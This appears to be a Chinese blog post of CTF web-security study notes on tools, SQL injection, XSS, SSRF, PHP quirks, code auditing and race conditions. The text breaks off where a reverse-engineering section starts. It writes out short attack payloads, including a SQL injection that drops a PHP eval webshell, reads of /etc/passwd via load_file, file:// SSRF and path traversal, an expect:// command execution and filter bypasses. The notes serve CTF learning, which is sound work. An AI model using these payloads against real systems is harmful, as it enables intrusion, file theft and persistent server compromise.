<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>楠寻网安版 | 楠 寻 の 小 窝</title><meta name="author" content="njmxye"><meta name="copyright" content="njmxye"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Web笔记一、常用工具安装及使用（一）Burp Suite 概述：基于 Java 开发的跨平台 Web 安全工具，集成 Proxy、Spider、Scanner、Intruder、Repeater 等模块，各模块共享框架，可高效处理 HTTP 消息，助力解决 Web 题目。 模块介绍 Proxy 代理模块：核心模块，用于截获和修改客户端（浏览器、手机 App 等）HTTP&#x2F;HTTPS 数据包。设置"><meta property="og:type" content="article"><meta property="og:title" content="楠寻网安版"><meta property="og:url" content="https://njmxye.github.io/2025/01/14/%E6%A5%A0%E5%AF%BB%E7%BD%91%E5%AE%89%E7%89%88/index.html"><meta property="og:site_name" content="楠 寻 の 小 窝"><meta property="og:description" content="Web笔记一、常用工具安装及使用（一）Burp Suite 概述：基于 Java 开发的跨平台 Web 安全工具，集成 Proxy、Spider、Scanner、Intruder、Repeater 等模块，各模块共享框架，可高效处理 HTTP 消息，助力解决 Web 题目。 模块介绍 Proxy 代理模块：核心模块，用于截获和修改客户端（浏览器、手机 App 等）HTTP&#x2F;HTTPS 数据包。设置"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://njmxye.github.io/img/1716767227197.jpg"><meta property="article:published_time" content="2025-01-14T00:00:00.000Z"><meta property="article:modified_time" content="2025-10-05T02:52:05.637Z"><meta property="article:author" content="njmxye"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://njmxye.github.io/img/1716767227197.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://njmxye.github.io/2025/01/14/%E6%A5%A0%E5%AF%BB%E7%BD%91%E5%AE%89%E7%89%88/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="cWyLZN3gSLDdjz3lqJl60UiBZnrX1fPVfGqm_rELJZA"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css"><link rel="stylesheet" href="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:void 0,translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlight.js",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",dateSuffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:void 0,infinitegrid:{js:"https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js",buttonText:"加载更多"},isPhotoFigcaption:!1,islazyload:!1,isAnchor:!1,percent:{toc:!0,rightside:!1},autoDarkmode:!1}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"楠寻网安版",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2025-10-05 02:52:05"}</script><script>(e=>{e.saveToLocal={set:(e,t,o)=>{if(0===o)return;const a={value:t,expiry:Date.now()+864e5*o};localStorage.setItem(e,JSON.stringify(a))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!(Date.now()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=(e,t={})=>new Promise(((o,a)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=a,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,o())},Object.keys(t).forEach((e=>{n.setAttribute(e,t[e])})),document.head.appendChild(n)})),e.getCSS=(e,t=!1)=>new Promise(((o,a)=>{const n=document.createElement("link");n.rel="stylesheet",n.href=e,t&&(n.id=t),n.onerror=a,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,o())},document.head.appendChild(n)})),e.activateDarkMode=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1716767227197.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url('https://www.helloimg.com/i/2024/12/20/6764f5f231582.png')"><nav id="nav"><span id="blog-info"><a href="/" title="楠 寻 の 小 窝"><span class="site-name">楠 寻 の 小 窝</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">楠寻网安版</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-14T00:00:00.000Z" title="发表于 2025-01-14 00:00:00">2025-01-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-05T02:52:05.637Z" title="更新于 2025-10-05 02:52:05">2025-10-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">37.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>127分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="楠寻网安版"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web笔记"><a href="#Web笔记" class="headerlink" title="Web笔记"></a>Web笔记</h1><h2 id="一、常用工具安装及使用"><a href="#一、常用工具安装及使用" class="headerlink" title="一、常用工具安装及使用"></a>一、常用工具安装及使用</h2><h3 id="（一）Burp-Suite"><a href="#（一）Burp-Suite" class="headerlink" title="（一）Burp Suite"></a>（一）Burp Suite</h3><ol><li><strong>概述</strong>：基于 Java 开发的跨平台 Web 安全工具，集成 Proxy、Spider、Scanner、Intruder、Repeater 等模块，各模块共享框架，可高效处理 HTTP 消息，助力解决 Web 题目。</li><li><strong>模块介绍</strong><ul><li><strong>Proxy 代理模块</strong>：核心模块，用于截获和修改客户端（浏览器、手机 App 等）HTTP/HTTPS 数据包。设置代理端口（如 8080），配置浏览器代理后，可在 Proxy→Intercept 选项卡控制数据包拦截与修改，还能将数据包发送至其他模块。</li><li><strong>Repeater 重放模块</strong>：常用于手工测试 HTTP Header 或复杂 POST 数据包中的注入点。在 Proxy 中右键发送数据包至此模块，可在左侧修改数据包后重发，其 Headers 和 Hex 标签页可便捷添加头信息或修改十六进制编码。</li><li><strong>Intruder 暴力破解模块</strong>：提供 Sniper、Battering ram、Pitchfork、Cluster bomb 四种攻击类型，用于爆破。在其他模块右键发送数据包后，在 Target、Position、Payload、Options 标签页设置攻击目标、位置、Payload 等参数，可根据电脑性能和网络状态调整线程等参数，并筛选结果。</li><li><strong>Decoder 解码模块</strong>：支持多种编码和解码操作，可处理 HTTP/HTTPS 数据，能以文本或十六进制模式查看，有常见哈希算法，但不推荐 Smart decode。</li><li><strong>Comparer 比较模块</strong>：在数据包差异小的情况下，用于比较发现差异，辅助分析。</li><li><strong>工程选项</strong>：可绑定域名与 IP，解决相关题目。</li></ul></li></ol><h3 id="（二）Sqlmap"><a href="#（二）Sqlmap" class="headerlink" title="（二）Sqlmap"></a>（二）Sqlmap</h3><ol><li><strong>概述</strong>：开源渗透测试工具，用 Python 开发，能自动检测和利用 SQL 注入漏洞，在 CTF Web 题中作用关键。</li><li><strong>使用方法</strong>：在 Linux 自带 Python 环境下或 Windows 安装 Python 后，下载解压源码包，命令行输入 <code>python sqlmap.py</code> 运行。提供命令行功能和 Burp 插件，常用参数如 <code>-u</code> 指定目标 URL，<code>--dbs</code> 列出数据库等；Tamper 可绕过过滤，如 <code>apostrophemask</code> 等。</li></ol><h3 id="（三）浏览器与插件"><a href="#（三）浏览器与插件" class="headerlink" title="（三）浏览器与插件"></a>（三）浏览器与插件</h3><ol><li><strong>浏览器选择</strong>：建议安装 IE、Firefox（开发者版本）、Chrome 等主流浏览器，因比赛可能存在兼容性或特定浏览器漏洞问题。</li><li><strong>Chrome 插件推荐</strong><ul><li><strong>Developer Tools</strong>：集成多种开发工具，如 Elements 可查看修改网页元素，Console 用于调试和交互，Sources 调试 JS，Network 查看请求响应信息，Application 记录网站资源，Security 判断网页安全性。</li><li><strong>Hasher</strong>：计算哈希、加密算法、编码转换等，类似 Burp Decoder 模块。</li><li><strong>Proxy SwitchyOmega</strong>：方便切换代理，结合 Burp 解决代理切换问题，支持内网渗透和科学上网。</li><li><strong>EditThisCookie</strong>：管理 Cookies，配合 XSS 题目获取管理员权限。</li><li><strong>User-Agent Switcher for Chrome</strong>：切换 User-Agent，应对相关题目。</li><li><strong>Wappalyzer</strong>：查看站点服务器等信息，但可能受题目干扰。</li><li><strong>SelectorGadget 和 XPath Helper</strong>：定位提取网页元素 XPath，辅助爬虫。</li></ul></li></ol><h3 id="（四）Nmap"><a href="#（四）Nmap" class="headerlink" title="（四）Nmap"></a>（四）Nmap</h3><ol><li><strong>概述</strong>：可扫描网络主机、服务及操作系统等信息，还能探测防火墙，命令格式为 <code>nmap [扫描类型][选项]&#123;目标或目标集合&#125;</code>。</li><li><strong>常用参数</strong><ul><li><strong>主机发现</strong>：如 <code>-sn</code> 仅进行主机发现，<code>-PE</code>、<code>-PS</code> 等通过不同协议探测主机。</li><li><strong>扫描参数</strong>：<code>-sS</code> SYN 扫描，<code>-sV</code> 版本探测，<code>-O</code> 操作系统探测等。</li><li><strong>扫描速度</strong>：<code>-T</code> 后跟数字设置速度等级。</li><li><strong>扫描端口</strong>：<code>-p</code> 指定端口范围，<code>-F</code> 快速扫描 100 个常用端口。支持自定义扫描脚本（NSE），可检测 SQL 注入等漏洞。</li></ul></li></ol><h2 id="二、SQL注入攻击"><a href="#二、SQL注入攻击" class="headerlink" title="二、SQL注入攻击"></a>二、SQL注入攻击</h2><h3 id="（一）概述"><a href="#（一）概述" class="headerlink" title="（一）概述"></a>（一）概述</h3><ol><li><strong>成因</strong>：开发人员将用户输入直接拼接至 SQL 语句，使 SQL 语句可控，引发漏洞。</li><li><strong>分类</strong><ul><li><strong>可回显注入</strong>：包括联合查询、报错注入、通过注入进行 DNS 请求回显。</li><li><strong>不可回显注入</strong>：Bool 盲注和时间盲注。</li><li><strong>二次注入</strong>：数据入库和使用时过滤不一致导致，业务逻辑复杂，常需脚本自动化注入。</li></ul></li></ol><h3 id="（二）注入类型及利用"><a href="#（二）注入类型及利用" class="headerlink" title="（二）注入类型及利用"></a>（二）注入类型及利用</h3><ol><li><strong>可以联合查询的 SQL 注入</strong>：如测试样例中，利用 <code>union</code> 拼接 Payload，闭合原语句单引号并注释多余部分，插入数据，注意服务器可能自动转换 <code>+</code> 为空格。常需绕过字符或单词过滤。</li><li><strong>报错注入</strong><ul><li><strong>updatexml</strong>：利用函数报错，如 <code>updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code> 可爆破数据库版本。</li><li><strong>floor</strong>：基于 <code>rand</code> 和 <code>order by</code> 或 <code>group by</code> 冲突报错，可爆破数据库版本、用户、当前数据库、指定表字段等信息。</li><li><strong>exp</strong>：利用溢出报错，如 <code>exp(~(select * from (select user())x))</code> 可获取用户信息。</li></ul></li><li><strong>Bool 盲注</strong>：因报错信息屏蔽产生，根据页面真假回显判断。通过添加 <code>and 1=1</code> 和 <code>and 1=2</code> 等 Payload 检测，可修改关键字绕过过滤，字符串型注入需闭合单引号，常使用截取、转换、比较函数，工具检测可能误报。</li><li><strong>时间盲注</strong>：类似 Bool 盲注，但依据页面响应时间判断，常用 <code>sleep()</code> 和 <code>benchmark()</code> 函数，因可能导致服务器负载过高，CTF 题目较少。</li><li><strong>二次注入</strong>：如 2016 年西电信安协会 l - ctf 题目，结合登录注册与头像显示，需编写脚本模拟操作，可能与其他注入类型结合。</li><li><strong>limit 之后的注入</strong>：在 MySQL 特定版本下，可在 <code>ORDER BY id LIMIT</code> 处注入，如 <code>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code>。</li></ol><h3 id="（三）注入点相关"><a href="#（三）注入点相关" class="headerlink" title="（三）注入点相关"></a>（三）注入点相关</h3><ol><li><strong>常见位置</strong>：GET 参数、POST 数据包、User - Agent、Cookies 等，可使用 Sqlmap 或手工验证。</li><li><strong>判断方法</strong>：插入单引号看是否报错，数字型用 <code>and 1=1</code> 等判断，还可通过数字加减尝试。</li></ol><h3 id="（四）绕过技术"><a href="#（四）绕过技术" class="headerlink" title="（四）绕过技术"></a>（四）绕过技术</h3><ol><li><strong>过滤关键字</strong>：可穿插关键字、大小写转换、十六进制替换、双重 URL 编码等绕过。</li><li><strong>过滤空格</strong>：利用注释、URL 编码、空白字符、特殊符号（反引号等）、科学计数法绕过。</li><li><strong>过滤单引号</strong>：旧版本 PHP 可在宽字节编码下（如 <code>%df%27</code>）尝试宽字节注入。</li><li><strong>绕过相等过滤</strong>：利用 MySQL 编码格式特性，如 <code>utf8_general_ci</code> 下某些等式成立。</li></ol><h3 id="（五）SQL-读写文件"><a href="#（五）SQL-读写文件" class="headerlink" title="（五）SQL 读写文件"></a>（五）SQL 读写文件</h3><ol><li><strong>读文件</strong>：在 MySQL 用户有 File 权限时，用 <code>load_file</code> 函数，如 <code>?id=-1+union+select+load_file(&#39;/etc/hosts&#39;)</code>，可十六进制编码文件名，也可读取常见配置文件找 flag。</li><li><strong>写文件</strong>：如 <code>?id=-1+union+select+&#39;&lt;?php eval($_POST[233]);?&gt;&#39;+into+outfile &#39;/var/www/html/shell.php&#39;</code>，需注意权限和文件名，还可写入 UDF 库执行命令。</li></ol><h2 id="三、跨站脚本攻击（XSS）"><a href="#三、跨站脚本攻击（XSS）" class="headerlink" title="三、跨站脚本攻击（XSS）"></a>三、跨站脚本攻击（XSS）</h2><h3 id="（一）概述-1"><a href="#（一）概述-1" class="headerlink" title="（一）概述"></a>（一）概述</h3><ol><li><strong>定义</strong>：网站应用安全漏洞，攻击者向网页注入恶意代码，用户浏览器加载页面时执行，危害大，在 CTF 常见。</li><li><strong>常见类型</strong>：反射型、存储型、DOM 型，还可按输出点分为 HTML 属性、CSS 代码、JavaScript 中输出。</li></ol><h3 id="（二）类型详解"><a href="#（二）类型详解" class="headerlink" title="（二）类型详解"></a>（二）类型详解</h3><ol><li><strong>反射型 XSS</strong>：客户端输入经服务端解析后返回并执行，如 <code>&lt;?php echo &#39;your input:&#39;. $_GET[&#39;input&#39;];?&gt;</code> 中，输入 <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> 可触发。</li><li><strong>存储型 XSS</strong>：如留言板应用，攻击者留言存储后其他用户访问执行，代码示例展示了留言板的存储和显示过程。</li><li><strong>DOM XSS</strong>：由浏览器端 DOM 解析触发，无需服务端解析响应，如代码中通过 <code>location.hash</code> 赋值触发。</li><li><strong>输出在 HTML 标签中</strong>：需闭合属性或标签注入新属性或标签，如在 <code>input</code> 标签中通过闭合 <code>value</code> 属性注入 <code>onclick</code> 属性。</li><li><strong>输出在 CSS 代码中</strong>：闭合 CSS 属性后注入新属性，如改变 <code>color</code> 属性并注入 <code>background-image</code> 属性。</li><li><strong>输出在 JavaScript 中</strong>：闭合代码后注入攻击代码，如在 <code>script</code> 标签中闭合单引号注入 <code>alert</code> 函数。</li></ol><h3 id="（三）防护与绕过"><a href="#（三）防护与绕过" class="headerlink" title="（三）防护与绕过"></a>（三）防护与绕过</h3><ol><li><strong>特定标签过滤绕过</strong>：可构造非标准标签或利用新标签（如 <code>video</code>）执行代码，参考 <code>HTML5 Security Cheatsheet</code>。</li><li><strong>事件过滤绕过</strong>：遍历未过滤的事件属性，利用 HTML5 新属性，如 <code>details</code>、<code>formaction</code> 等绕过。</li><li><strong>敏感关键字过滤绕过</strong><ul><li><strong>字符串拼接与混淆</strong>：用数组调用函数并拼接字符串混淆，或利用 Base64 编码解码绕过。</li><li><strong>编码解码</strong>：使用多种编码（HTML、CSS、JavaScript 进制编码、URL 编码、JSFuck 编码等），推荐 <code>XSSEE</code> 工具。</li><li><strong>利用其他位置</strong>：将代码置于 <code>location.*</code>、<code>window.name</code> 等不提交至服务端的位置，结合编码绕过关键字过滤，还可针对敏感符号过滤进行特殊处理。</li></ul></li><li><strong>字符集编码导致的绕过</strong>：如利用 UTF - 7、宽字节、特殊字符等编码问题绕过过滤，不同字符集有不同利用方式。</li><li><strong>长度限制绕过</strong>：使用 <code>window.name</code>、<code>location.*</code>、第三方库工厂函数（如 jQuery 的 <code>$()</code>）或注释减少输入点代码量。</li><li><strong>HttpOnly 绕过</strong>：可利用 Apache 等服务器漏洞（如 CVE - 2012 - 0053）、PHPINFO 页面、Flash/Java API 获取 HttpOnly Cookie。</li><li><strong>XSS Auditor 绕过</strong>：利用字符集编码、协议理解问题、CRLF 注入等绕过 Chrome 浏览器 XSS Auditor。</li><li><strong>内容安全策略（CSP）绕过</strong><ul><li><strong>CSP 配置错误利用</strong>：针对配置错误场景（如策略不全、包含不安全源等）进行绕过。</li><li><strong>unsafe-inline 下的绕过</strong>：利用 <code>DNS Prefetch</code>、<code>location.href</code> 等方法绕过。</li><li><strong>script-src’self’下的绕过</strong>：通过 302 跳转绕过，利用重定向机制读取其他目录资源。</li><li><strong>CRLF 导致的绕过</strong>：注入 CRLF 将 CSP 头分割至响应体，使 XSS 代码不受 CSP 影响。</li></ul></li></ol><h3 id="（四）危害与利用技巧"><a href="#（四）危害与利用技巧" class="headerlink" title="（四）危害与利用技巧"></a>（四）危害与利用技巧</h3><ol><li><strong>危害</strong>：窃取 Cookie、与 DOM 对象交互、获取网页源码、发起 HTTP 请求、获取地理位置和网络信息、扫描内网主机等。</li><li><strong>利用示例</strong>：展示了使用 WebRTC API 获取网络信息的代码，推荐开源利用平台 <code>BeEF</code>。</li></ol><h3 id="（五）实例"><a href="#（五）实例" class="headerlink" title="（五）实例"></a>（五）实例</h3><p>HCTF 2016 中 <code>guestbook</code> 题目，过滤函数单层可绕过，如 <code>scrscriptipt</code>，CSP 规则因开启 <code>unsafe-inline</code> 可利用 <code>locatioonn.href</code> 等方法绕过。</p><h2 id="四、服务端请求伪造（SSRF）"><a href="#四、服务端请求伪造（SSRF）" class="headerlink" title="四、服务端请求伪造（SSRF）"></a>四、服务端请求伪造（SSRF）</h2><h3 id="（一）形成原因"><a href="#（一）形成原因" class="headerlink" title="（一）形成原因"></a>（一）形成原因</h3><p>服务端获取外部数据功能未有效过滤限制目标地址，如 <code>&lt;?php $url = $_GET[&#39;url&#39;]; echo file_get_contents($url);?&gt;</code> 易受攻击。</p><h3 id="（二）防护绕过"><a href="#（二）防护绕过" class="headerlink" title="（二）防护绕过"></a>（二）防护绕过</h3><p>开发者正则过滤可通过特殊格式（<code>http://example.com@evil.com</code>）、IP 地址进制转换及省略写法、配置域名等绕过。</p><h3 id="（三）危害与利用技巧"><a href="#（三）危害与利用技巧" class="headerlink" title="（三）危害与利用技巧"></a>（三）危害与利用技巧</h3><ol><li><strong>端口扫描</strong>：通过向不同端口发送请求，根据响应判断端口开放情况。</li><li><strong>攻击内网服务</strong>：利用漏洞攻击内网存在漏洞的服务，如利用 Gopher 协议攻击 Redis 等，展示了攻击 Redis 的 Payload。</li><li><strong>指纹识别与攻击内网应用</strong>：通过请求特定文件识别内网应用指纹，再利用漏洞攻击，如针对 Wordpress、JBoss 应用的攻击 Payload。</li><li><strong>文件读取</strong>：指定 <code>file</code> 协议读取服务器文件，如 <code>http://example.com/ssrf.php?url=file:///etc/passwd</code>。</li><li><strong>命令执行</strong>：PHP 环境安装 <code>expect</code> 扩展时，可用 <code>expect</code> 协议执行系统命令，如 <code>http://example.com/ssrf.php?url=expect://id</code>。</li></ol><h3 id="（四）实例"><a href="#（四）实例" class="headerlink" title="（四）实例"></a>（四）实例</h3><p>XDCTF（LCTF）2015 中 Web 300 题，先读取源代码，再利用 SSRF 扫描端口发现 Discuz!7.2 论坛，最后利用论坛 SQL 注入漏洞获取管理员密码（flag）。</p><h2 id="五、利用特性进行攻击"><a href="#五、利用特性进行攻击" class="headerlink" title="五、利用特性进行攻击"></a>五、利用特性进行攻击</h2><h3 id="（一）PHP-语言特性"><a href="#（一）PHP-语言特性" class="headerlink" title="（一）PHP 语言特性"></a>（一）PHP 语言特性</h3><ol><li><strong>弱类型</strong>：<code>==</code> 比较会自动类型转换，导致漏洞，如 <code>if($input == 1)</code> 中，<code>1abc</code> 可满足条件。MD5 函数返回值以 <code>0e</code> 开头时会被转换为 0，可利用此进行绕过，还可利用函数参数和返回值类型转换漏洞，如 <code>strpos</code> 函数。</li><li><strong>反序列化漏洞</strong>：<code>unserialize</code> 函数参数可控时形成漏洞，结合类中的 <code>magic</code> 函数（如 <code>__construct</code>、<code>__destruct</code>、<code>__toString</code> 等）可执行危险逻辑，展示了 NJCTF 2017 题目利用过程。</li><li><strong>截断</strong>：NULL 字符截断（如 <code>?file=../../../etc/passwd%00</code>）和路径长度绕过在旧版本 PHP 可行，<code>iconv</code> 函数在特定条件下也可截断字符串（如 <code>?file=shell.jpg%ff</code>，Windows 系统且特定版本 PHP）。</li><li><strong>伪协议</strong>：可利用伪协议（如 <code>http</code>、<code>zip</code>、<code>phar</code>、<code>php://filter</code> 等）绕过文件包含限制或读取文件。</li><li><strong>变量覆盖</strong><ul><li><strong>函数使用不当</strong>：<code>extract</code>、<code>parse_str</code>、<code>import_request_variables</code> 函数可能导致变量覆盖，展示了相应 Payload。</li><li><strong>配置不当</strong>：PHP 版本小于 5.4 且 <code>register_globals=ON</code> 时可能出现全局变量覆盖漏洞。</li><li><strong>代码逻辑漏洞</strong>：使用 <code>foreach</code> 遍历数组注册变量可能存在漏洞，如 <code>foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125;</code>。</li></ul></li><li><strong>防护绕过</strong>：<code>open_basedir</code> 可通过 <code>DirectoryIterator+Glob</code> 绕过，<code>disable_function</code> 可利用系统漏洞（如 <code>shellshock</code>、<code>imagemagick</code>）或环境变量（<code>LD_PRELOAD</code>）绕过，也可调用数据库 UDF 执行命令。</li></ol><h3 id="（二）Windows-系统特性"><a href="#（二）Windows-系统特性" class="headerlink" title="（二）Windows 系统特性"></a>（二）Windows 系统特性</h3><ol><li><strong>短文件名</strong>：Windows 生成 8.3 格式短文件名，IIS 6 可枚举文件，Apache 可下载长文件，如利用 <code>discuz</code> 备份文件泄露可减少枚举量。</li><li><strong>文件上传</strong>：黑名单限制后缀时，可利用高位字符（<code>[\x80-\xff]</code>）、<code>::$data</code> 或 <code>.php:.png</code> 形式绕过，后两者有不同效果。</li></ol><h2 id="六、代码审计"><a href="#六、代码审计" class="headerlink" title="六、代码审计"></a>六、代码审计</h2><h3 id="（一）源码泄露途径"><a href="#（一）源码泄露途径" class="headerlink" title="（一）源码泄露途径"></a>（一）源码泄露途径</h3><ol><li><strong>常见备份文件</strong><ul><li><strong>文本备份文件</strong>：如 <code>.index.php.swp</code> 等，是编辑器或开发者备份文件。</li><li><strong>整站源码备份文件</strong>：如 <code>www.zip</code> 等，找到可审计源码，还可利用 <code>.DS_Store</code> 等文件找备份位置。</li></ul></li><li><strong>Git 泄露</strong><ul><li><strong>特征搜索</strong>：通过网站特征字符串在 GitHub 搜索项目源码，如 NJCTF 2017 题目。</li><li><strong>.git 泄露</strong>：利用工具（GitHack、scrabble）根据 git 原理恢复项目文件，介绍了 scrabble 源码分析和还原过程，如 XDCTF 2015 的 Web2 题利用此获取 flag。</li></ul></li><li><strong>svn 泄露</strong>：与 git 类似，可使用 <code>svn-extractor</code> 工具解决。</li><li><strong>利用漏洞泄露</strong>：利用文件包含或下载漏洞获取源码，常与其他漏洞配合。</li></ol><h3 id="（二）审计方法与技巧"><a href="#（二）审计方法与技巧" class="headerlink" title="（二）审计方法与技巧"></a>（二）审计方法与技巧</h3><ol><li><strong>小型代码审计</strong>：按找输入点、过滤及绕过方法、处理函数、漏洞利用的步骤进行，以 ASIS 2016 的 Binary Cloud 题为例，分析了文件上传漏洞的审计过程，通过绕过过滤函数实现文件上传。</li><li><strong>大型代码审计</strong>：先找危险函数，再回溯找输入点，尝试绕过过滤，最后寻找触发漏洞方法，以 phpok 注入例子展示了审计流程。</li><li><strong>审计工具</strong><ul><li><strong>RIPS</strong>：利用 <code>token_get_all</code> 分析代码语法识别漏洞，虽有缺点，但可作为框架修改，介绍了其使用方法和扫描结果查看。</li><li><strong>Seay 源代码审计系统</strong>：根据正则表达式匹配判断漏洞，有自动审计和全局搜索功能，可自定义规则。还可借助安全狗等工具辅助审计。</li></ul></li></ol><h2 id="七、条件竞争"><a href="#七、条件竞争" class="headerlink" title="七、条件竞争"></a>七、条件竞争</h2><h3 id="（一）概述-2"><a href="#（一）概述-2" class="headerlink" title="（一）概述"></a>（一）概述</h3><p>多个线程或进程读写共享数据时，因未加锁或同步互斥管理，执行顺序影响结果，如银行转账示例中，无锁机制导致账户余额计算错误。</p><h3 id="（二）问题分析及测试"><a href="#（二）问题分析及测试" class="headerlink" title="（二）问题分析及测试"></a>（二）问题分析及测试</h3><ol><li><strong>一般代码逻辑引发的条件竞争</strong>：以网站访问计数代码为例，多用户同时访问会导致计数不准确。可使用 Burp Intruder 模块（设置 Payloads 和线程数）或 Python 脚本（利用多线程并发请求）测试，结果显示实际记录次数小于预期。</li><li><strong>数据库无锁机制引发的条件竞争</strong>：以 MySQL InnoDB 存储引擎为例，介绍了共享锁和排他锁机制，因普通 <code>select</code> 语句无锁，多个线程同时访问查询结果可利用条件竞争漏洞，如 0CTF 2017 题目。</li></ol><h2 id="八、案例解析"><a href="#八、案例解析" class="headerlink" title="八、案例解析"></a>八、案例解析</h2><h3 id="（一）NSCTF-2015-Web-实例"><a href="#（一）NSCTF-2015-Web-实例" class="headerlink" title="（一）NSCTF 2015 Web 实例"></a>（一）NSCTF 2015 Web 实例</h3><p>题目上传 <code>php5</code> 文件后虽写入 flag 但很快删除，利用条件竞争漏洞，通过多线程并发上传和访问，在文件删除前获取 flag，给出了 Python 测试代码。</p><h3 id="（二）湖湘杯-2016-线上选拔赛-Web-实例"><a href="#（二）湖湘杯-2016-线上选拔赛-Web-实例" class="headerlink" title="（二）湖湘杯 2016 线上选拔赛 Web 实例"></a>（二）湖湘杯 2016 线上选拔赛 Web 实例</h3><p>题目通过备份文件给出源码，注册和登录页面逻辑存在时间差，在插入用户密码后未插入权限信息时登录可获取 flag，提供了相应 Python 测试代码和数据库结构。</p><h3 id="（三）0CTF-2017-Web-实例"><a href="#（三）0CTF-2017-Web-实例" class="headerlink" title="（三）0CTF 2017 Web 实例"></a>（三）0CTF 2017 Web 实例</h3><p>注册登录后账户资金操作存在条件竞争漏洞，卖出时先更新余额再扣除货物，可多线程并发操作获取更多金钱，展示了 Python 测试代码和部分源码。</p><h3 id="（四）2019-WCTF-大师赛赛题剖析：P-door"><a href="#（四）2019-WCTF-大师赛赛题剖析：P-door" class="headerlink" title="（四）2019 WCTF 大师赛赛题剖析：P - door"></a>（四）2019 WCTF 大师赛赛题剖析：P - door</h3><p>题目涉及代码审计和反序列化漏洞，存在 Git 泄露。利用路径穿越实现任意目录写，通过构造参数和利用反序列化漏洞及魔法方法，绕过过滤写入 Webshell，再利用 Redis 主从模式安全问题获取 flag，详细分析了代码审计和漏洞利用过程。</p><h1 id="Reverse笔记"><a href="#Reverse笔记" class="headerlink" title="Reverse笔记"></a>Reverse笔记</h1><h2 id="一、逆向分析基础"><a href="#一、逆向分析基础" class="headerlink" title="一、逆向分析基础"></a>一、逆向分析基础</h2><h3 id="（一）主要方法"><a href="#（一）主要方法" class="headerlink" 